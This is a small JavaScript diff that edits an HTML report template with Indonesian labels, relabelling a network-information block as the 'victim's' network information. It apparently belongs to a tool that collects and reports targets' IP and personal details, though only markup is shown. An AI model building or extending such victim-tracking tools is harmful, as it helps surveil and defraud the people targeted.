@@ -72,7 +72,7 @@ try {
         ipInfoHtml = `
   <div style="font-family:Arial,sans-serif;line-height:1.7;">
     <div style="margin-bottom:12px;font-weight:bold;">
-      INFORMASI JARINGAN
+      ⚠️INFORMASI JARINGAN KORBAN⚠️
     </div>
 
     <div style="padding:10px;background:#f4f5f8;border-radius:8px;margin-bottom:8px;">
@@ -126,7 +126,6 @@ try {
           <td style="padding:12px 16px;color:#1b1e25;font-weight:600;">${belakang}</td>
         </tr>
         <tr>
-          <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Info jaringan</td>
           <td style="padding:12px 16px;color:#1b1e25;font-size:13px;">${ipInfoHtml}</td>
         </tr>
       </table>
